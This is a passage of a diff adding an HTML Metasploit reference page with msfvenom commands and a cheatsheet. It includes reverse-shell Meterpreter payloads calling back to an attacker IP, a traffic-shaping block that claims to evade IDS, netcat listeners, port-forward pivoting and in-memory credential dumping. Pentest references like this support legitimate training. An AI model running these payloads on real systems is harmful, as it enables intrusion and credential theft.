+              <code class="code-line__code"><span class="tok-cmd">msfvenom</span> <span class="tok-flag">-p</span> <span class="tok-val">linux/x64/meterpreter_reverse_tcp</span> <span class="tok-flag">LHOST=</span><span class="tok-arg">10.10.14.5</span> <span class="tok-flag">LPORT=</span><span class="tok-arg">4444</span> <span class="tok-flag">-f</span> <span class="tok-val">elf</span> <span class="tok-flag">-o</span> <span class="tok-arg">shell.elf</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">msfvenom</span> <span class="tok-flag">-p</span> <span class="tok-val">php/meterpreter_reverse_tcp</span> <span class="tok-flag">LHOST=</span><span class="tok-arg">10.10.14.5</span> <span class="tok-flag">LPORT=</span><span class="tok-arg">4444</span> <span class="tok-flag">-f</span> <span class="tok-val">raw</span> <span class="tok-flag">-o</span> <span class="tok-arg">shell.php</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: Modern Evasion Malleable C2 -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Modern Evasion — Malleable C2 HTTP Profiles (Metasploit 6.5+)</div>
+              <div class="cmd-block__desc">Shape Meterpreter network traffic to mirror legitimate web applications (e.g. Amazon, jQuery, Cloudflare).</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">msfvenom</span> <span class="tok-flag">-p</span> <span class="tok-val">windows/x64/meterpreter_reverse_https</span> <span class="tok-flag">LHOST=</span><span class="tok-arg">10.10.14.5</span> <span class="tok-flag">LPORT=</span><span class="tok-arg">443</span> <span class="tok-flag">MALLEABLEC2=</span><span class="tok-val">/opt/profiles/amazon.profile</span> <span class="tok-flag">-f</span> <span class="tok-val">exe</span> <span class="tok-flag">-o</span> <span class="tok-arg">shell.exe</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-accent); font-weight: 600;">Evasion Architecture:</span> Malleable C2 transforms URI patterns, HTTP headers, and body telemetry to blend into normal corporate outbound HTTPS browsing, bypassing network-based IDS/IPS inspection.
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 3: Listing Formats & Payloads -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Discovering payloads and output formats</div>
+              <div class="cmd-block__desc">Filter available architecture payloads and output formats directly via the msfvenom CLI.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">msfvenom</span> <span class="tok-flag">--list</span> <span class="tok-val">payloads</span> <span class="tok-pipe">|</span> <span class="tok-cmd">grep</span> <span class="tok-arg">windows/x64</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">msfvenom</span> <span class="tok-flag">--list</span> <span class="tok-val">formats</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 6. Cheatsheet -->
+    <section class="content-section" id="cheatsheet" aria-labelledby="cheatsheet-title">
+      <h2 class="content-section__title" id="cheatsheet-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+        Quick Cheatsheet &amp; Tool Chains
+      </h2>
+      <div class="cheat-grid">
+        <div class="cheat-cell"><div class="cheat-cell__label">Launch quiet</div><div class="cheat-cell__code">msfconsole -q</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Initialize DB</div><div class="cheat-cell__code">sudo systemctl start postgresql &amp;&amp; msfdb init</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Create workspace</div><div class="cheat-cell__code">workspace -a ClientA</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Search by CVE</div><div class="cheat-cell__code">search cve:2021-44228 type:exploit</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Use module by index</div><div class="cheat-cell__code">use 0</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Auxiliary SMB scan</div><div class="cheat-cell__code">use auxiliary/scanner/smb/smb_version</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Safe check</div><div class="cheat-cell__code">check</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Replayable RC script</div><div class="cheat-cell__code">makerc /tmp/eng.rc</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Global attacker IP</div><div class="cheat-cell__code">setg LHOST 10.10.14.5</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Log console output</div><div class="cheat-cell__code">spool /tmp/eng.log</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Background session</div><div class="cheat-cell__code">background  (or Ctrl+Z)</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">List active sessions</div><div class="cheat-cell__code">sessions -l</div></div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>CHAIN &rarr; Nmap to MSF</span><span style="font-size:10px; color:var(--c-accent); font-weight:700;">CHAIN</span></div>
+          <div class="cheat-cell__code">db_import nmap_scan.xml</div>
+        </div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>CHAIN &rarr; MSF to John</span><span style="font-size:10px; color:var(--c-accent); font-weight:700;">CHAIN</span></div>
+          <div class="cheat-cell__code">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</div>
+        </div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>CHAIN &rarr; MSF to Netcat</span><span style="font-size:10px; color:var(--c-accent); font-weight:700;">CHAIN</span></div>
+          <div class="cheat-cell__code">nc -lvnp 4444  (catches stageless meterpreter_reverse_tcp)</div>
+        </div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<script src="../assets/app.js"></script>
+<script>
+registerSearchItems([
+  { tool:'MSF', cmd:'msfconsole -q', desc:'Launch Metasploit console in quiet mode', target:'metasploit.html#overview' },
+  { tool:'MSF', cmd:'msfdb init', desc:'Initialize PostgreSQL database backend for MSF', target:'metasploit.html#database' },
+  { tool:'MSF', cmd:'workspace -a ClientA', desc:'Create and switch to an engagement workspace', target:'metasploit.html#database' },
+  { tool:'MSF', cmd:'db_import scan.xml', desc:'Import Nmap XML results directly into MSF database', target:'metasploit.html#database' },
+  { tool:'MSF', cmd:'makerc /tmp/eng.rc', desc:'Save console command history as replayable script', target:'metasploit.html#database' },
+  { tool:'MSF', cmd:'spool /tmp/eng.log', desc:'Log all console output to engagement evidence file', target:'metasploit.html#database' },
+  { tool:'MSF', cmd:'search type:exploit platform:windows', desc:'Search modules filtered by exploit type and platform', target:'metasploit.html#search' },
+  { tool:'MSF', cmd:'use auxiliary/scanner/smb/smb_version', desc:'Scan subnet for SMB OS and service versions', target:'metasploit.html#search' },
+  { tool:'MSF', cmd:'check', desc:'Safely validate target vulnerability without firing exploit', target:'metasploit.html#pitfalls' },
+  { tool:'MSF', cmd:'setg LHOST 10.10.14.5', desc:'Set persistent global attacking IP across all modules', target:'metasploit.html#search' },
+  { tool:'MSF', cmd:'use exploit/multi/handler', desc:'Initialize universal multi/handler listener', target:'metasploit.html#payloads' },
+  { tool:'MSF', cmd:'portfwd add -l 3389 -p 3389 -r 172.16.1.10', desc:'Pivot local port to internal subnet host via Meterpreter', target:'metasploit.html#meterpreter' },
+  { tool:'MSF', cmd:'use post/multi/recon/local_exploit_suggester', desc:'Automated privilege escalation exploit suggester', target:'metasploit.html#meterpreter' },
+  { tool:'MSF', cmd:'msfvenom -p windows/x64/meterpreter_reverse_https MALLEABLEC2=profile.txt', desc:'Generate EDR-evasive payload with Malleable C2', target:'metasploit.html#msfvenom' },
+  { tool:'MSF', cmd:'load kiwi; creds_all', desc:'In-memory Mimikatz credential extraction', target:'metasploit.html#meterpreter' }
+]);
+</script>
+</body>
+</html>
